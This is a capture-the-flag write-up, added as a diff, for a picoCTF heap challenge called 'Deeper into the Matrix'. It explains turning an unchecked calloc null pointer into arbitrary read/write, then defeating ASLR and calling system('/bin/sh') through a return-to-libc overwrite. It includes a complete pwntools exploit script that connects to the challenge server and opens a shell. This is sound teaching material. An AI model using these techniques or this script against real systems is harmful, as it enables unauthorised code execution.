@@ -1,0 +1,136 @@
+Writeup for Deeper into the Matrix
+
+We used the code for the first matrix problem since the majority of it is the same, and looked at the disassembly of the matrix binary for confirmation. Now, we need to find a vulnerability. The previous overflow was, obviously, fixed. Looking at the code for matrix, we can see that space for the matrix struct is allocated using malloc, and that the space for the matrix data is allocated using calloc. Going along with the hint, which refers to a null pointer, we noticed that malloc and calloc return a null pointer when there is not enough space on the heap. Since the program doesn't check if calloc returns a null pointer, and since we can allocate more space than available on the heap using very large matrices, we can trigger this condition.
+
+Now that we have a matrix struct allocated where the data pointer is a null pointer, and since both rows and cols are 10000, we can write to and read from any address from 0x0 to 0x17d78400 (10000*10000*4) using the old technique, but correctly this time (to access address x, row=x/4/10000, col=x/4%10000). This isn't full arbitrary read/write, but it's enough to read/write to the data section where the matrix* pointers are stored. We can then fake a matrix struct directly after a pointer and change the pointer to point to this fake struct, at which point we have true arbitrary read/write since we have control over a data pointer. We can now access any address in memory by changing this data pointer. This is essentially a two-step process to arbitrary read/write. One issue that we have to be aware of is that since matrix entry read/writes are done as single-precision floats, we have to be careful about the infinity and NaN floats. This means that we cannot write or read values which require the biased exponent to be all 1s. In other words, we can't read/write values which are represented in big-endian binary as x11111111xxxxxxxxxxxxxxxxxxxxxxx. Unfortunately, stack addresses are of this form (0xfff...), and we need to write and read from the stack as explained later to exploit the binary.
+
+Thankfully, there's another way: we write the data pointer to be a bit smaller than the actual address we want to read, and use a small col offset when reading or writing so that the actual address we read from or write to is in this forbidden range. We used struct to perform this single precision float to/from hex conversion.
+
+Now that we have arbitrary read and write, we need to find something to attack. As the hint says, the GOT is protected and we cannot write to it. Therefore, we decided to overwrite the return pointer of the handle_set function to gain eip because this is the function we used to overwrite other addresses. As such, the return address of this function will be the next one to be returned to. Now we need to return to system with the argument of "/bin/sh". After inspecting the structure of the stack when the handle_set function returns, we found that it is structured as:
+<Return Address> <ID> <ROW> <COL> <VALUE>
+The structure for successfully calling system("/bin/sh") is:
+<System Address> <Anything> <Arg 1> ...
+In this case, we want arg 1 to be the address for /bin/sh. We can place /bin/sh on the heap, and provide this address as the row argument for handle_set.
+Next, because aslr is enabled, we will need to find the stack, and the libc. We found libc easily by reading from setbuf GOT, and calculating the offset of that and system. Then, to find the stack, we brute forced the range of addresses from 0xffa050c0 to 0xffffffff until we found something nonzero. Then starting from there, we brute forced until we found 0x08049068, something on the stack. From here, we can calcualte where esp is, successfully finding the stack.
+
+Now that we have everything we need, we just need to overwrite the return address while providing the address for /bin/sh as the row argument (/bin/sh was placed on the heap for convenience).
+
+from pwn import *
+import traceback
+
+
+def run_cmd(cmd,after=True):
+    r.recvuntil('Enter command: ',timeout=5)
+    #print cmd
+    r.send(cmd + '\n')
+    if after:
+        return r.recvline(timeout=5)
+            
+
+def get_hex(res):
+    real = float(res.rsplit(' ',1)[1])
+    return int(enhex(struct.pack('>f', real)),16)
+
+def get_float(val):
+    return struct.unpack('>f', unhex(hex(val)[2:].zfill(8)))[0]
+
+def get_word(addr):
+    a1 = addr / 4
+    a2 = a1 // 10000
+    a3 = a1 % 10000
+    res = run_cmd('get 34 {} {}'.format(a2,a3))
+    return get_hex(res)
+
+def set_word(addr, val):
+    if val & 0xff800000 == 0xff800000:
+        print 'Could you not'
+        return
+
+    a1 = addr / 4
+    a2 = a1 // 10000
+    a3 = a1 % 10000
+    right = get_float(val)
+    res = run_cmd('set 34 {} {} {}'.format(a2,a3,right))
+
+def set_word_e(addr, val, row=None):
+    if val & 0xff800000 == 0xff800000:
+        print 'Could you not'
+        return
+
+    offset = 0
+    if row is None and addr & 0xff800000 == 0xff800000: # avoid NaN
+        addr -= 0x00800000
+        offset += 0x00800000 / 4
+
+    if row:
+        set_word(0x804b088, 1) # 1 col
+        baddr = addr - row * 4
+        print 'baddr = {}'.format(hex(baddr))
+        set_word(0x804b08c, baddr)
+        res = run_cmd('set 0 {} 0 {}'.format(row, get_float(val)))
+
+    else:
+        set_word(0x804b08c, addr)
+        res = run_cmd('set 0 0 {} {}'.format(offset, get_float(val)))
+
+def get_word_e(addr):
+    offset = 0
+    if addr & 0xff800000 == 0xff800000: # avoid NaN
+        addr -= 0x00800000
+        offset += 0x00800000 / 4 
+    set_word(0x804b08c, addr)
+    res = run_cmd('get 0 0 {}'.format(offset))
+    return get_hex(res)
+
+if __name__ == '__main__':
+    while True:
+        r = remote('shell2017.picoctf.com', 34094)
+        #r = process('./matrix2', aslr=True)
+        for _ in range(35):
+            run_cmd('create 10000 10000')
+
+        set_word(0x804b080, 0x804b084)
+        set_word(0x804b084, 0x7f7fffff)
+        set_word(0x804b088, 0x7f7fffff)
+
+        try:
+            print 'testing'
+            res = get_word_e(0xffa05ffc)
+            print('{}: {}'.format(hex(0xffa05688), hex(res)))
+            search_range = 0x100
+            for i in range(0xffa050c0, 0xffffffff, search_range):
+                w = get_word_e(i)
+                if w != 0:
+                    break
+                print('{}: {}'.format(hex(i), hex(get_word_e(i))))
+            base = i - search_range
+            for i in range(base + 11244, 0xffffffff, 4):
+                w = get_word_e(i)
+                if w == 0x08049068:
+                    esp = i + 9*4
+                    print('found esp: {}'.format(hex(i + 9*4)))
+                    break
+
+            heap_addr = get_word_e(0x804b090) # need to put /bin/sh
+            print 'Putting /bin/sh at {}'.format(hex(heap_addr))
+            set_word_e(heap_addr, 0x6e69622f) # /bin
+            set_word_e(heap_addr + 4, 0x0068732f) # /sh\x00
+
+            setbuf = get_word_e(0x804afc8)
+            system = setbuf - 184176
+            #print hex(get_word_e(system))
+            real_esp = 228 + esp
+            print 'esp of set: {}'.format(hex(real_esp))
+
+            # custom set_word_e with /bin/sh as arg
+            set_word_e(real_esp, system, heap_addr)
+
+            r.interactive()
+
+
+        except Exception, e:
+            traceback.print_exc()
+            r.close()
+            continue
+
+        r.close()
